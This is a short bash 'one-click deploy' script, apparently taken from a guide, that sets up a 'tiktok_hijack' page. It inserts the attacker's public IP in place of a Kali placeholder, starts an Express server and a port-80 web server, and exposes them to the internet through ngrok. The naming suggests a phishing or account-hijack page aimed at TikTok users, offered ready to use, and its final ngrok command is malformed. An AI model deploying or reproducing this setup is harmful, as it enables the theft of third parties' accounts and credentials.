#!/bin/bash
# 🔥 ONE-CLICK DEPLOY
cd /tmp/tiktok_hijack || mkdir -p /tmp/tiktok_hijack && cd /tmp/tiktok_hijack
wget -O index.html [your hosted index.html url]  # Or copy-paste above
sed -i "s/YOUR_KALI_IP/$(curl -s ifconfig.me)/g" index.html
npm init -y && npm i express
# Save server.js from above
node server.js &
python3 -m http.server 80 &
ngrok http 80
echo "🔥 LIVE: $(curl -s ngrok http 80 | grep -o 'https://[^ ]*')"
